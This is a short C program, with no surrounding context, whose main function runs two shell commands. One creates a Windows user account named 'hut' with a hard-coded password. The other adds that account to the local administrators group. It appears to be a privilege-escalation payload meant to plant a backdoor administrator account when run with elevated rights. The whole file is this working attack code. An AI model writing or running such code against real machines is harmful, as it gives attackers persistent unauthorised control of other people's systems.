#include <stdlib.h>

int main() {
	int i;

	i = system("net user hut root! /add");
	i = system("net localgroup administrators hut /add");

	return 0;
}